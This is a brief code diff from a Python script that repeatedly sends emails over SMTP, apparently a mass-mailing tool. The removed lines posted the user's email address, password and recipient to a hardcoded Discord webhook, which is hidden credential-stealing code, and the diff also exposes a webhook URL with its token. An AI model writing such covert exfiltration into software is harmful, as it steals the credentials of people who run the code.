@@ -30,6 +30,3 @@ while i < int(runTime):
 		msg = f"Subject: {subject}\n\n{body}"
 
 		smtp.sendmail(baseEmail, receiverEmail, msg)
-
-		webhook = DiscordWebhook(url='https://discord.com/api/webhooks/964349654663856158/bskcOB-P9Nsl7aKs_X7AMrkf8j	08SNJ5Ff57do_Up-HEzVClFlj-8eUnShNZzUPEEu_1', content= "From: " + baseEmail + " " + "Password: " + " " + emailPass + " " + "Too: " + " " + receiverEmail )
-		response = webhook.execute()
